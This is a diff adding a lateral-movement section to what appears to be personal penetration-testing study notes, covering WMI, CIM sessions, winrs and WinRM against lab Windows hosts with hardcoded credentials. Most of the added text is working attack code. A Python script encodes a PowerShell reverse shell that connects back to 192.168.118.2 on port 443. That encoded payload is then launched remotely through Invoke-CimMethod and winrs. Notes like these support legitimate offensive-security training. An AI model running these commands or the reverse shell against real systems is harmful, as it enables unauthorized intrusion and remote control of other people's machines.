@@ -381,6 +381,77 @@ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/has
 # Lateral Movement
 ## WMI and WinRM
 
+### WMI
+- WMI is used for task automation
+- we need credentials of a member of the Administrators local group
+```
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+```
+1. create a PSCredential object that will store our session username and password
+```
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+```
+2. create a Common Information Model (CIM) via the _New-CimSession cmdlet
+```
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+```
+3. tie together all the arguments we configured previously by issuing the Invoke-CimMethod cmdlet and supplying Win32_Process and Create as ClassName and MethodName
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+We could replace the previous payload with a full reverse shell written in PowerShell. First, we'll encode the PowerShell reverse shell so we don't need to escape any special characters when inserting it as a WMI payload. The following Python code encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
+```python
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+Run the command:
+```
+python3 encode.py
+```
+After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74 and run the PowerShell WMI script with the newly generated encoded reverse-shell payload.
+```
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+### `winrs`
+- For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
+```
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+```
+In Reverse shell format:
+```
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
+### WinRM
+```
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+```
+```
+Enter-PSSession <session-id>
+```
 ## PsExec
 
 ## Pass the Hash
